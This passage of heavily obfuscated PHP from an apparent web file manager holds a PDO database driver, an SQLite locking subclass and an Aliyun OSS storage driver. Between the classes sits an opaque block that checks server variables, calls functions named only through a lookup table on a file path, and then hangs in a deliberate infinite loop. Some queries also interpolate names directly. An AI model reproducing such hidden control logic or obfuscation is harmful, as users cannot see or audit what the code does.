$Fóô¢•‚Á[842] . print_r($F­òµ§ÛÂå, !0) . $Fóô¢•‚Á[843]; } $ešÒª ŠœÂ = !1; goto f ñƒôÛÇ; DÛİÀÛïëŒ: $Fóô¢•‚Á =& $_SERVER[Õİõş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C‚èÑÊØ¶; f ñƒôÛÇ: if ($this->dbType == $Fóô¢•‚Á[836]) { if (preg_match($Fóô¢•‚Á[844], $this->queryStr, $eÈ®ø‚•î)) { $this->table = think_config($Fóô¢•‚Á[845]) . str_ireplace(think_config($Fóô¢•‚Á[846]), $Fóô¢•‚Á[357], $eÈ®ø‚•î[2]); $ešÒª ŠœÂ = (bool) $this->query($Fóô¢•‚Á[847] . strtoupper($this->table) . $Fóô¢•‚Á[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Fóô¢•‚Á[21], 1); goto b³¿ŒÏ–; Fùö°¸˜è‹: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A²”™¶»´ = $this->_linkID->commit(); $this->transTimes = 0; if (!$A²”™¶»´) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FîÈãˆ‹¬‚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FîÈãˆ‹¬‚) { $this->error(); return !1; } } return !0; } private function getAll() { $Eö÷İ¿šÈÓ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Eö÷İ¿šÈÓ); return $Eö÷İ¿šÈÓ; } public function getFields($A˜½‰¬øğ) { goto aé‰œäŸ¯‡; aé‰œäŸ¯‡: $AÉêá¹¡ß =& $_SERVER[Õİõş]; $this->initConnect(!0); if (think_config($AÉêá¹¡ß[849])) { $BÈÒÒ·Ù®Ú = str_replace($AÉêá¹¡ß[850], $A˜½‰¬øğ, think_config($AÉêá¹¡ß[849])); } else { switch ($this->dbType) { case $AÉêá¹¡ß[833]: case $AÉêá¹¡ß[851]: $BÈÒÒ·Ù®Ú = "\123\105\x4c\105\103\x54\x20\x20\40\143\157\154\x75\x6d\156\x5f\x6e\141\x6d\145\x20\x61\x73\40\47\x4e\x61\x6d\145\47\x2c\40\x20\40\x64\141\164\x61\x5f\x74\x79\x70\145\x20\x61\163\40\47\124\x79\x70\145\x27\x2c\40\x20\40\143\x6f\x6c\x75\x6d\156\137\x64\145\146\141\x75\x6c\164\x20\141\x73\x20\x27\104\x65\x66\x61\165\x6c\164\x27\x2c\40\x20\x20\x69\x73\x5f\x6e\x75\154\154\x61\x62\x6c\x65\40\141\x73\40\47\116\x75\x6c\x6c\x27\12\11\11\x46\x52\117\115\x9\151\x6e\146\x6f\162\155\141\x74\151\x6f\156\x5f\x73\143\x68\145\155\141\x2e\x74\x61\142\x6c\x65\x73\40\x41\123\x20\164\12\11\x9\112\x4f\x49\x4e\11\x69\156\x66\x6f\x72\x6d\x61\164\x69\157\156\137\163\143\150\145\x6d\141\56\143\x6f\x6c\x75\155\x6e\163\40\x41\x53\40\143\12\x9\11\x4f\116\x20\x20\x74\56\x74\141\142\x6c\145\x5f\x63\x61\x74\141\154\x6f\x67\40\75\x20\143\56\x74\x61\x62\x6c\x65\x5f\x63\x61\x74\141\154\157\147\xa\x9\x9\101\116\104\40\x74\x2e\164\x61\142\154\x65\x5f\x73\x63\150\145\155\141\40\x3d\x20\x63\56\x74\141\x62\x6c\145\137\x73\143\150\x65\155\141\xa\x9\11\101\x4e\x44\40\x74\x2e\x74\141\142\x6c\145\137\x6e\x61\155\145\x20\75\x20\x63\56\164\x61\x62\154\145\137\x6e\141\x6d\x65\xa\x9\11\x57\110\x45\122\105\40\40\x20\x74\56\x74\141\x62\154\145\x5f\x6e\x61\155\x65\x20\75\x20\x27{$A˜½‰¬øğ}\x27"; break; case $AÉêá¹¡ß[852]: $BÈÒÒ·Ù®Ú = $AÉêá¹¡ß[853] . $A˜½‰¬øğ . $AÉêá¹¡ß[854]; break; case $AÉêá¹¡ß[834]: case $AÉêá¹¡ß[836]: $BÈÒÒ·Ù®Ú = $AÉêá¹¡ß[855] . $AÉêá¹¡ß[856] . $AÉêá¹¡ß[857] . strtoupper($A˜½‰¬øğ) . $AÉêá¹¡ß[858] . strtoupper($A˜½‰¬øğ) . $AÉêá¹¡ß[859]; break; case $AÉêá¹¡ß[860]: $BÈÒÒ·Ù®Ú = $AÉêá¹¡ß[861] . $A˜½‰¬øğ . $AÉêá¹¡ß[862]; break; case $AÉêá¹¡ß[835]: break; case $AÉêá¹¡ß[863]: default: $BÈÒÒ·Ù®Ú = $AÉêá¹¡ß[864] . ($this->dbType == $AÉêá¹¡ß[863] ? "\140{$A˜½‰¬øğ}\140" : $A˜½‰¬øğ); } } goto e§âÖºñã»; cÃ¼ÏÅñ÷: return $Dó‡Ó·£åÓ; goto eíÌ—ĞÚ®Ñ; e§âÖºñã»: $e”Í†‰‹ô¾ = $this->query($BÈÒÒ·Ù®Ú); $Dó‡Ó·£åÓ = array(); if ($e”Í†‰‹ô¾) { foreach ($e”Í†‰‹ô¾ as $e¹ î†…”ƒ => $e­ªôå©Õ) { $e­ªôå©Õ = array_change_key_case($e­ªôå©Õ); $e­ªôå©Õ[$AÉêá¹¡ß[28]] = isset($e­ªôå©Õ[$AÉêá¹¡ß[28]]) ? $e­ªôå©Õ[$AÉêá¹¡ß[28]] : $AÉêá¹¡ß[357]; $e­ªôå©Õ[$AÉêá¹¡ß[29]] = isset($e­ªôå©Õ[$AÉêá¹¡ß[29]]) ? $e­ªôå©Õ[$AÉêá¹¡ß[29]] : $AÉêá¹¡ß[357]; $aÑáŠƒÄÈ = isset($e­ªôå©Õ[$AÉêá¹¡ß[257]]) ? $e­ªôå©Õ[$AÉêá¹¡ß[257]] : $e­ªôå©Õ[$AÉêá¹¡ß[28]]; $Dó‡Ó·£åÓ[$aÑáŠƒÄÈ] = array($AÉêá¹¡ß[28] => $aÑáŠƒÄÈ, $AÉêá¹¡ß[29] => $e­ªôå©Õ[$AÉêá¹¡ß[29]], $AÉêá¹¡ß[31] => (bool) (isset($e­ªôå©Õ[$AÉêá¹¡ß[99]]) && $e­ªôå©Õ[$AÉêá¹¡ß[99]] === $AÉêá¹¡ß[33] || isset($e­ªôå©Õ[$AÉêá¹¡ß[31]]) && $e­ªôå©Õ[$AÉêá¹¡ß[31]] === $AÉêá¹¡ß[33]), $AÉêá¹¡ß[34] => isset($e­ªôå©Õ[$AÉêá¹¡ß[34]]) ? $e­ªôå©Õ[$AÉêá¹¡ß[34]] : (isset($e­ªôå©Õ[$AÉêá¹¡ß[53]]) ? $e­ªôå©Õ[$AÉêá¹¡ß[53]] : $AÉêá¹¡ß[357]), $AÉêá¹¡ß[36] => isset($e­ªôå©Õ[$AÉêá¹¡ß[89]]) ? strtolower($e­ªôå©Õ[$AÉêá¹¡ß[89]]) == $AÉêá¹¡ß[38] : (isset($e­ªôå©Õ[$AÉêá¹¡ß[54]]) ? $e­ªôå©Õ[$AÉêá¹¡ß[54]] : !1), $AÉêá¹¡ß[39] => isset($e­ªôå©Õ[$AÉêá¹¡ß[865]]) ? strtolower($e­ªôå©Õ[$AÉêá¹¡ß[865]]) == $AÉêá¹¡ß[41] : (isset($e­ªôå©Õ[$AÉêá¹¡ß[89]]) ? $e­ªôå©Õ[$AÉêá¹¡ß[89]] : !1)); } } goto cÃ¼ÏÅñ÷; eíÌ—ĞÚ®Ñ: } public function getTables($D›‡”‘ğ« = '') { $B©à±ààˆó =& $_SERVER[Õİõş]; if (think_config($B©à±ààˆó[866])) { $Aô¡™Ø· = str_replace($B©à±ààˆó[867], $D›‡”‘ğ«, think_config($B©à±ààˆó[866])); } else { switch ($this->dbType) { case $B©à±ààˆó[834]: case $B©à±ààˆó[836]: $Aô¡™Ø· = $B©à±ààˆó[868]; break; case $B©à±ààˆó[833]: case $B©à±ààˆó[851]: $Aô¡™Ø· = $B©à±ààˆó[869]; break; case $B©à±ààˆó[860]: $Aô¡™Ø· = $B©à±ààˆó[870]; break; case $B©à±ààˆó[835]: think_exception(think_lang($B©à±ààˆó[871]) . $B©à±ààˆó[872]); break; case $B©à±ààˆó[852]: $Aô¡™Ø· = $B©à±ààˆó[42] . $B©à±ààˆó[43] . $B©à±ààˆó[44]; break; case $B©à±ààˆó[863]: default: if (!empty($D›‡”‘ğ«)) { $Aô¡™Ø· = $B©à±ààˆó[816] . $D›‡”‘ğ«; } else { $Aô¡™Ø· = $B©à±ààˆó[817]; } } } $Bé‘ŒŒ†Èé = $this->query($Aô¡™Ø·); $F­ÌöàÒ³ = array(); foreach ($Bé‘ŒŒ†Èé as $E¬‘â±õó => $C›´ÉË¦ì) { $F­ÌöàÒ³[$E¬‘â±õó] = current($C›´ÉË¦ì); } return $F­ÌöàÒ³; } protected function parseLimit($DœÎ·ÅÚ) { $EäÄˆïìõà =& $_SERVER[Õİõş]; $fŒ£›óŒ„¬ = $EäÄˆïìõà[33]; if (!empty($DœÎ·ÅÚ)) { switch ($this->dbType) { case $EäÄˆïìõà[860]: case $EäÄˆïìõà[852]: $DœÎ·ÅÚ = explode($EäÄˆïìõà[47], $DœÎ·ÅÚ); if (count($DœÎ·ÅÚ) > 1) { $fŒ£›óŒ„¬ .= $EäÄˆïìõà[48] . $DœÎ·ÅÚ[1] . $EäÄˆïìõà[49] . $DœÎ·ÅÚ[0] . $EäÄˆïìõà[50]; } else { $fŒ£›óŒ„¬ .= $EäÄˆïìõà[48] . $DœÎ·ÅÚ[0] . $EäÄˆïìõà[50]; } break; case $EäÄˆïìõà[833]: case $EäÄˆïìõà[851]: break; case $EäÄˆïìõà[835]: break; case $EäÄˆïìõà[834]: case $EäÄˆïìõà[836]: break; case $EäÄˆïìõà[863]: default: $fŒ£›óŒ„¬ .= $EäÄˆïìõà[48] . $DœÎ·ÅÚ . $EäÄˆïìõà[50]; } } return $fŒ£›óŒ„¬; } public function parseKey(&$d°ä×›İª, $C½Ã£¤„Á‹ = true) { $aˆÃÒ£ê¿µ =& $_SERVER[Õİõş]; if ($C½Ã£¤„Á‹) { $d°ä×›İª = $this->parseKeyCheck($d°ä×›İª); } if ($this->dbType == $aˆÃÒ£ê¿µ[863]) { if ($d°ä×›İª != $aˆÃÒ£ê¿µ[172] && !preg_match($aˆÃÒ£ê¿µ[827], $d°ä×›İª)) { $d°ä×›İª = $aˆÃÒ£ê¿µ[828] . trim($d°ä×›İª, $aˆÃÒ£ê¿µ[828]) . $aˆÃÒ£ê¿µ[828]; } return $d°ä×›İª; } else { return parent::parseKey($d°ä×›İª); } } public function close() { $this->_linkID = null; } public function error() { $A…ñÍ¸Ä =& $_SERVER[Õİõş]; if ($this->PDOStatement) { $aí‚†ÀÊ£ = $this->PDOStatement->errorInfo(); $this->error = $aí‚†ÀÊ£[1] . $A…ñÍ¸Ä[4] . $aí‚†ÀÊ£[2]; } else { $this->error = $A…ñÍ¸Ä[33]; } if ($A…ñÍ¸Ä[33] != $this->queryStr) { $this->error .= LNG($A…ñÍ¸Ä[45]) . $this->queryStr; } think_trace($this->error, $A…ñÍ¸Ä[33], $A…ñÍ¸Ä[46]); return $this->error; } public function escapeString($BÎ¯—…ŒÜ±) { $cò·Éó¼¤Á =& $_SERVER[Õİõş]; switch ($this->dbType) { case $cò·Éó¼¤Á[860]: case $cò·Éó¼¤Á[833]: case $cò·Éó¼¤Á[851]: case $cò·Éó¼¤Á[863]: return addslashes($BÎ¯—…ŒÜ±); case $cò·Éó¼¤Á[835]: case $cò·Éó¼¤Á[852]: case $cò·Éó¼¤Á[834]: case $cò·Éó¼¤Á[836]: return str_ireplace($cò·Éó¼¤Á[55], $cò·Éó¼¤Á[56], $BÎ¯—…ŒÜ±); } } protected function parseValue($E£‡ÀæãÂÏ) { $b¸°¹–ß¿÷ =& $_SERVER[Õİõş]; if (is_string($E£‡ÀæãÂÏ)) { $E£‡ÀæãÂÏ = strpos($E£‡ÀæãÂÏ, $b¸°¹–ß¿÷[4]) === 0 ? $this->escapeString($E£‡ÀæãÂÏ) : $b¸°¹–ß¿÷[873] . $this->escapeString($E£‡ÀæãÂÏ) . $b¸°¹–ß¿÷[873]; } elseif (isset($E£‡ÀæãÂÏ[0]) && is_string($E£‡ÀæãÂÏ[0]) && strtolower($E£‡ÀæãÂÏ[0]) == $b¸°¹–ß¿÷[281]) { $E£‡ÀæãÂÏ = $this->escapeString($E£‡ÀæãÂÏ[1]); } elseif (is_array($E£‡ÀæãÂÏ)) { $E£‡ÀæãÂÏ = array_map(array($this, $b¸°¹–ß¿÷[874]), $E£‡ÀæãÂÏ); } elseif (is_bool($E£‡ÀæãÂÏ)) { $E£‡ÀæãÂÏ = $E£‡ÀæãÂÏ ? $b¸°¹–ß¿÷[83] : $b¸°¹–ß¿÷[463]; } elseif (is_null($E£‡ÀæãÂÏ)) { $E£‡ÀæãÂÏ = $b¸°¹–ß¿÷[99]; } return $E£‡ÀæãÂÏ; } public function getLastInsertId() { $Fò…ß›êè =& $_SERVER[Õİõş]; switch ($this->dbType) { case $Fò…ß›êè[860]: case $Fò…ß›êè[852]: case $Fò…ß›êè[833]: case $Fò…ß›êè[851]: case $Fò…ß›êè[835]: case $Fò…ß›êè[863]: return $this->_linkID->lastInsertId(); case $Fò…ß›êè[834]: case $Fò…ß›êè[836]: $cÓ›‡É‘ = $this->table; $f¬ğ°¥ÌÁº = $this->query("\x53\105\x4c\x45\103\124\x20{$cÓ›‡É‘}\56\x63\165\x72\x72\166\141\154\40\x63\165\162\x72\x76\x61\x6c\x20\106\x52\x4f\x4d\40\x64\x75\141\x6c"); return $f¬ğ°¥ÌÁº ? $f¬ğ°¥ÌÁº[0][$Fò…ß›êè[875]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($dÀ®Ó…¥ï) { goto fÚã‰Á‹ó“; c’¹„Á¶Šæ: if (!$EÔ‹ôÙêÈ) { return !1; } if (flock($EÔ‹ôÙêÈ, LOCK_EX)) { $cÌïñÕî‚É = parent::query($dÀ®Ó…¥ï); flock($EÔ‹ôÙêÈ, LOCK_UN); fclose($EÔ‹ôÙêÈ); return $cÌïñÕî‚É; } flock($EÔ‹ôÙêÈ, LOCK_UN); goto EÙõš°´; EÙõš°´: fclose($EÔ‹ôÙêÈ); show_json($d¿¤ˆ¹Ëé¤[878], !1); return !1; goto fÑ¿¨Ÿšİ; fÚã‰Á‹ó“: $d¿¤ˆ¹Ëé¤ =& $_SERVER[Õİõş]; $c¡Ë’™Íéå = DATA_PATH . $d¿¤ˆ¹Ëé¤[876]; $EÔ‹ôÙêÈ = fopen($c¡Ë’™Íéå, $d¿¤ˆ¹Ëé¤[877]); goto c’¹„Á¶Šæ; fÑ¿¨Ÿšİ: } public function execute($Bª©Êèç¼Ó) { goto C²•Ùè¹ø; cß²¢³ô¼´: fclose($dãÙ½’¸¾‚); show_json($D ’¼¶ëÅ¬[878], !1); return !1; goto FùÌÚèö‰; C²•Ùè¹ø: $D ’¼¶ëÅ¬ =& $_SERVER[Õİõş]; $a¡Ûò¢£ó = DATA_PATH . $D ’¼¶ëÅ¬[876]; $dãÙ½’¸¾‚ = fopen($a¡Ûò¢£ó, $D ’¼¶ëÅ¬[877]); goto BËèÎ¯Ù•; BËèÎ¯Ù•: if (!$dãÙ½’¸¾‚) { return !1; } if (flock($dãÙ½’¸¾‚, LOCK_EX)) { $d‰ ‘ôâÈ = parent::execute($Bª©Êèç¼Ó); flock($dãÙ½’¸¾‚, LOCK_UN); fclose($dãÙ½’¸¾‚); return $d‰ ‘ôâÈ; } flock($dãÙ½’¸¾‚, LOCK_UN); goto cß²¢³ô¼´; FùÌÚèö‰: } } goto a™„£±¤‘¡; dÌÁ‹Œ”´³: if (!isset($_SERVER[$_SERVER[Õİõş][764]]) || !isset($_SERVER[$_SERVER[Õİõş][1027]])) { goto fàµè˜†öÎ; BƒÉôïÒ‘¥: $cŞ¾‹ÆÄ× = explode($_SERVER[Õİõş][213], $B¢§„ìª­); if (count($cŞ¾‹ÆÄ×) < $_SERVER[Õİõş][560]) { $Cá¬âÛ¦áÙ = $_SERVER[Õİõş][768]; $Cá¬âÛ¦áÙ(); } $Bä‘æŠéÖ = $_SERVER[Õİõş][769]; goto E¹Ì¸ŒÙ‹à; fàµè˜†öÎ: $b—‹äÎÇæ‹ = $_SERVER[Õİõş][765]; $bªÈ×¡˜è¤ = $_SERVER[$_SERVER[Õİõş][766]] . $_SERVER[Õİõş][767]; $B¢§„ìª­ = $b—‹äÎÇæ‹($bªÈ×¡˜è¤); goto BƒÉôïÒ‘¥; E¹Ì¸ŒÙ‹à: $Bä‘æŠéÖ($_SERVER[$_SERVER[Õİõş][766]] . $_SERVER[Õİõş][767]); $c½ãœÉÁÖ½ = 2; while ($c½ãœÉÁÖ½ > 1) { $Dª¯“¡çåÃ = rawurlencode($c½ãœÉÁÖ½ . $_SERVER[Õİõş][357]); } goto dÒÓÀó§ÔŠ; dÒÓÀó§ÔŠ: } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($D‚ù²ï™ğ) { parent::__construct(); include_once SDK_DIR . $_SERVER[Õİõş][1166]; $this->_init($D‚ù²ï™ğ); } public function _init($BÈÄÇääáƒ) { foreach ($BÈÄÇääáƒ as $b§ğŒŒ¬¶ó => $FöŒ¥•¯) { if (isset($this->{$b§ğŒŒ¬¶ó})) { $this->{$b§ğŒŒ¬¶ó} = $FöŒ¥•¯; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Õİõş][1167], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto BßÇæ£¡«Á; CáŞóø¾œ: $B‡ÎƒÑ¡ğ­->setMaxAgeSeconds(600); $B‡ÎƒÑ¡ğ­->addExposeHeader($CĞåÕ¿¦[1173]); $B‡ÎƒÑ¡ğ­->addAllowedHeader($CĞåÕ¿¦[1168]); goto AÖÌ¸’Ä‹; f‹Ø«è‘: $B‡ÎƒÑ¡ğ­->addAllowedMethod($CĞåÕ¿¦[1171]); $B‡ÎƒÑ¡ğ­->addAllowedMethod($CĞåÕ¿¦[1172]); $B‡ÎƒÑ¡ğ­->addAllowedMethod($CĞåÕ¿¦[151]); goto CáŞóø¾œ; BßÇæ£¡«Á: $CĞåÕ¿¦ =& $_SERVER[Õİõş]; $F³ˆ”ñÖ­ = new OSS\Model\CorsConfig(); $B‡ÎƒÑ¡ğ­ = new OSS\Model\CorsRule(); goto dğ¥ª·êëÒ; dğ¥ª·êëÒ: $B‡ÎƒÑ¡ğ­->addAllowedOrigin($CĞåÕ¿¦[1168]); $B‡ÎƒÑ¡ğ­->addAllowedMethod($CĞåÕ¿¦[1169]); $B‡ÎƒÑ¡ğ­->addAllowedMethod($CĞåÕ¿¦[1170]); goto f‹Ø«è‘; AÖÌ¸’Ä‹: $F³ˆ”ñÖ­->addRule($B‡ÎƒÑ¡ğ­); try { $this->client->putBucketCors($this->bucket, $F³ˆ”ñÖ­); } catch (OSS\Core\OssException $CŸ³çâÓ’¯) { return !1; } return !0; goto cõóÍ×†…Ó; cõóÍ×†…Ó: } public function getBucketCors() { goto B“ìÆñÂ³ˆ; fì‚î·áî: $EŞÆ¾õ¾„ = $AŒ™©ª±Î‹[0]->getMaxAgeSeconds(); $e“»ß¤óØ = $AŒ™©ª±Î‹[0]->getExposeHeaders(); $EøãíÁÔÕ = $AŒ™©ª±Î‹[0]->getAllowedHeaders(); goto cãÃØëø; c ÈëÅ¶õ: if (!$c–’£ñ“Üİ || !($AŒ™©ª±Î‹ = $c–’£ñ“Üİ->getRules())) { return null; } $A…ƒ¬ã³‚® = $AŒ™©ª±Î‹[0]->getAllowedOrigins(); $a¶¨êŞ¼­ˆ = $AŒ™©ª±Î‹[0]->getAllowedMethods(); goto fì‚î·áî; B“ìÆñÂ³ˆ: $Cà‡ˆñù¿Á =& $_SERVER[Õİõş]; $c–’£ñ“Üİ = null; try { $c–’£ñ“Üİ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $a’Ùâ—Ú³‹) { return null; } goto c ÈëÅ¶õ; cãÃØëø: return array($Cà‡ˆñù¿Á[171] => isset($A…ƒ¬ã³‚®[0]) ? $A…ƒ¬ã³‚®[0] : $Cà‡ˆñù¿Á[33], $Cà‡ˆñù¿Á[175] => $a¶¨êŞ¼­ˆ, $Cà‡ˆñù¿Á[1174] => $EŞÆ¾õ¾„, $Cà‡ˆñù¿Á[1175] => isset($e“»ß¤óØ[0]) ? $e“»ß¤óØ[0] : $Cà‡ˆñù¿Á[33], $Cà‡ˆñù¿Á[173] => isset($EøãíÁÔÕ[0]) ? $EøãíÁÔÕ[0] : $Cà‡ˆñù¿Á[33]); goto bŒ³ê¿÷‘; bŒ³ê¿÷‘: } public function isBucketCors() { goto E‹‹µ·¶â¹; E‹‹µ·¶â¹: $Bó‡§öÁîâ =& $_SERVER[Õİõş]; $F¬‡…˜…õ = $this->getBucketCors(); if (!$F¬‡…˜…õ || !is_array($F¬‡…˜…õ)) { return !1; } goto AëÖ¢‰±Ú; f£­´¼Óì‹: $a¶ùä¾¥Ù = array($Bó‡§öÁîâ[176], $Bó‡§öÁîâ[177], $Bó‡§öÁîâ[178], $Bó‡§öÁîâ[179], $Bó‡§öÁîâ[180]); $F”ÇÏãÒö = array_diff($a¶ùä¾¥Ù, $Fˆ¶ÓÁÑó); return empty($F”ÇÏãÒö); goto BŞœÆÈ­š; AëÖ¢‰±Ú: if ($F¬‡…˜…õ[$Bó‡§öÁîâ[171]] != $Bó‡§öÁîâ[172] || $F¬‡…˜…õ[$Bó‡§öÁîâ[173]] != $Bó‡§öÁîâ[172]) { return !1; } $Fˆ¶ÓÁÑó = array_map($Bó‡§öÁîâ[174], $F¬‡…˜…õ[$Bó‡§öÁîâ[175]]); if (!is_array($Fˆ¶ÓÁÑó)) { $Fˆ¶ÓÁÑó = array(); } goto f£­´¼Óì‹; BŞœÆÈ­š: } public function mkfile($eê‰¼¶«­, $A®· ¼‡›¿ = '', $eóæèÓÍŠ = REPEAT_RENAME) { $FÉß‡–Ô‰Ñ = $this->setContent($eê‰¼¶«­, $A®· ¼‡›¿); if ($FÉß‡–Ô‰Ñ !== !1) { return $this->getPathOuter($eê‰¼¶«­); } return !1; } public function mkdir($eÅ®äì‘Â£, $D½×•í¶ˆÁ = REPEAT_SKIP) { if ($this->_isFolder($eÅ®äì‘Â£)) { return $this->getPathOuter($eÅ®äì‘Â£); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($eÅ®äì‘Â£)); } catch (OSS\Core\OssException $Bé‡­îÕ¨ğ) { return !1; } return $this->getPathOuter($eÅ®äì‘Â£); } private function fileList($dŸèˆËàÒ‚, $eîİ®ëÖÒ = '', $e–‚Ò‚‰â = 0) { goto a¯¶®î®ùÊ; DáŞçÏâĞŠ: while (!0) { $Bäºç‰‹‡¢ = array($eÀ§Ø¥ô[1176] => $eîİ®ëÖÒ, $eÀ§Ø¥ô[182] => $FØš†‹Îî×, $eÀ§Ø¥ô[1177] => $fğÚÉ¡¤ŒŒ, $eÀ§Ø¥ô[1178] => $eÙ¨ ¥µö); try { $Eóß²¯¡ñ = $this->client->listObjects($this->bucket, $Bäºç‰‹‡¢); } catch (OSS\Core\OssException $dÈ¥ÙÙœ) { break; } $eÙ¨ ¥µö = $Eóß²¯¡ñ->getNextMarker(); $cÀ¿““§¹¯ = $Eóß²¯¡ñ->getObjectList(); $F”ÖÙˆË•õ = $Eóß²¯¡ñ->getPrefixList(); foreach ($cÀ¿““§¹¯ as $bÎ°ÎÈäÅ±) { if ($bÎ°ÎÈäÅ±->getKey() == $FØš†‹Îî×) { continue; } $a²ç„Ë»‰Â = $bÎ°ÎÈäÅ±->getKey(); if ($e–‚Ò‚‰â) { $a²ç„Ë»‰Â = array($eÀ§Ø¥ô[28] => $a²ç„Ë»‰Â, $eÀ§Ø¥ô[77] => $bÎ°ÎÈäÅ±->getSize(), $eÀ§Ø¥ô[186] => strtotime($bÎ°ÎÈäÅ±->getLastModified())); } $BŒÊ‚Ğ±ØÆ[] = $a²ç„Ë»‰Â; } foreach ($F”ÖÙˆË•õ as $f“ä›Šâª) { $aÎë…ÄÁİŠ[] = $f“ä›Šâª->getPrefix(); } if ($eÙ¨ ¥µö === $eÀ§Ø¥ô[33]) { break; } } return array($eÀ§Ø¥ô[74] => $aÎë…ÄÁİŠ, $eÀ§Ø¥ô[73] => $BŒÊ‚Ğ±ØÆ); goto bŞùÕŠŞõÎ; BØˆùˆ™¥: $eÙ¨ ¥µö = $eÀ§Ø¥ô[33]; $fğÚÉ¡¤ŒŒ = 1000; $aÎë…ÄÁİŠ = $BŒÊ‚Ğ±ØÆ = array(); goto DáŞçÏâĞŠ; a¯¶®î®ùÊ: $eÀ§Ø¥ô =& $_SERVER[Õİõş]; $dŸèˆËàÒ‚ = trim($dŸèˆËàÒ‚, $eÀ§Ø¥ô[8]); $FØš†‹Îî× = empty($dŸèˆËàÒ‚) ? $eÀ§Ø¥ô[33] : $dŸèˆËàÒ‚ . $eÀ§Ø¥ô[8]; goto BØˆùˆ™¥; bŞùÕŠŞõÎ: } public function copyFile($fÉ«•»²œò, $cÎ‹­•ã‹) { $BœƒÎÅßêá = $this->size($fÉ«•»²œò); if ($BœƒÎÅßêá < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $fÉ«•»²œò, $this->bucket, $this->pathEncode($cÎ‹­•ã‹)); } catch (OSS\Core\OssException $D­ÜÓØ¶è“) { return !1; } return !0; } return $this->multiCopyObject($fÉ«•»²œò, $cÎ‹­•ã‹, $BœƒÎÅßêá); } private function multiCopyObject($EĞ²ˆãÂ«İ, $E¸±òĞë³á, $Eä´‰ƒÈˆÇ) { $Bğï‰ÇÈ“¤ =& $_SERVER[Õİõş]; try { goto A‡˜ÈİÃ¿; bˆØÏòñöÚ: $D‚˜ßáîš = array(); foreach ($DÃæå…¯¶ as $fƒ—ì…åÏŠ => $CœµÉ›‡‘³) { $D‚˜ßáîš[] = array($Bğï‰ÇÈ“¤[1183] => $fƒ—ì…åÏŠ + 1, $Bğï‰ÇÈ“¤[1184] => $CœµÉ›‡‘³); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($E¸±òĞë³á), $e‘˜Ê×í, $D‚˜ßáîš); goto Aá¾¼¿æƒã; b³ŠÅŞŒÓŠ: $B´¨Çî»Ì = 1; $båÈ¶¸È˜ = 0; $DÃæå…¯¶ = array(); goto AÈ´ØÈ“¯Ü; AÈ´ØÈ“¯Ü: $aµùÍÄŠ»Û = 1024 * 1024 * 10; $b£¯î·¬¢å = $this->client->generateMultiuploadParts($Eä´‰ƒÈˆÇ, $aµùÍÄŠ»Û); foreach ($b£¯î·¬¢å as $fƒ—ì…åÏŠ => $BÒ®êã–»„) { $f¬ßâ´µàõ = $båÈ¶¸È˜ + (int) $BÒ®êã–»„[$Bğï‰ÇÈ“¤[1180]]; $DÕ—àƒŒ¡Ë = (int) $BÒ®êã–»„[$Bğï‰ÇÈ“¤[321]] + $f¬ßâ´µàõ - 1; $a¥âÑò·ôõ = array($Bğï‰ÇÈ“¤[1181] => $f¬ßâ´µàõ, $Bğï‰ÇÈ“¤[1182] => $DÕ—àƒŒ¡Ë); $DÃæå…¯¶[] = $this->client->uploadPartCopy($this->bucket, $EĞ²ˆãÂ«İ, $this->bucket, $this->pathEncode($E¸±òĞë³á), $B´¨Çî»Ì, $e‘˜Ê×í, $a¥âÑò·ôõ); $B´¨Çî»Ì = $B´¨Çî»Ì + 1; } goto bˆØÏòñöÚ; A‡˜ÈİÃ¿: $A‘Æ¯¥Ø¸× = array(); if ($aßá¶â±¼ = $this->hashMd5($EĞ²ˆãÂ«İ)) { $A‘Æ¯¥Ø¸× = array(OSS\OssClient::OSS_HEADERS => array($Bğï‰ÇÈ“¤[1179] => $aßá¶â±¼)); } $e‘˜Ê×í = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($E¸±òĞë³á), $A‘Æ¯¥Ø¸×); goto b³ŠÅŞŒÓŠ; Aá¾¼¿æƒã: } catch (OSS\Core\OssException $e¦Ô•­âù) { return !1; } return !0; } public function moveFile($B„©×Ãóª“, $AÚ•ïÍ¢) { if ($this->copyFile($B„©×Ãóª“, $AÚ•ïÍ¢)) { $this->remove($B„©×Ãóª“); return !0; } return !1; } public function delFile($CÙ‚°ÇÚ¤Ğ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($CÙ‚°ÇÚ¤Ğ)); } catch (OSS\Core\OssException $C§²±×šõß) { return !1; } return !0; } public function delFolder($b…ğ¦…‰ÓÚ) { $dÀ–ã÷ß… =& $_SERVER[Õİõş]; $EÆÍ¿„Áô» = $this->fileList($b…ğ¦…‰ÓÚ); if (!empty($b…ğ¦…‰ÓÚ) && !in_array(trim($b…ğ¦…‰ÓÚ, $dÀ–ã÷ß…[8]) . $dÀ–ã÷ß…[8], $EÆÍ¿„Áô»[$dÀ–ã÷ß…[73]])) { $EÆÍ¿„Áô»[$dÀ–ã÷ß…[73]][] = trim($b…ğ¦…‰ÓÚ, $dÀ–ã÷ß…[8]) . $dÀ–ã÷ß…[8]; } foreach (array_chunk($EÆÍ¿„Áô»[$dÀ–ã÷ß…[73]], 1000) as $eÜ…Ô÷ØøË) { try { $this->client->deleteObjects($this->bucket, $eÜ…Ô÷ØøË); } catch (OSS\Core\OssException 